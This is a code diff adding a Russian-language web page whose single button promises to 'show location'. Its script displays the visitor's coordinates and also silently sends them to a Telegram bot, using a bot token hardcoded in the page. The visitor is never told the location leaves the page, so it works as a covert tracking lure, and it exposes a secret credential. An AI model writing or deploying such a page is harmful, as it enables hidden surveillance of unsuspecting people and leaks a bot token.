@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Геолокация</title>
+  <style>
+    body {
+      background: #111;
+      color: #fff;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      flex-direction: column;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #00ffae;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    button:hover {
+      background-color: #00cc8b;
+    }
+    #result {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #ccc;
+    }
+  </style>
+</head>
+<body>
+  <button onclick="sendLocation()">Показать местоположение</button>
+  <div id="result"></div>
+
+  <script>
+    function sendLocation() {
+      const result = document.getElementById('result');
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          result.textContent = `Координаты: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
+
+          const token = "7787462314:AAFV9M0Y4Lh_mr6_22eFeFzDb2u1yUGlX3I";
+          const chat_id = "YOUR_CHAT_ID";
+          const message = `📍 Геолокация:\nШирота: ${lat}\nДолгота: ${lon}`;
+
+          fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
+        }, error => {
+          result.textContent = "Ошибка при получении геолокации.";
+        });
+      } else {
+        result.textContent = "Геолокация не поддерживается этим браузером.";
+      }
+    }
+  </script>
+</body>
+</html>
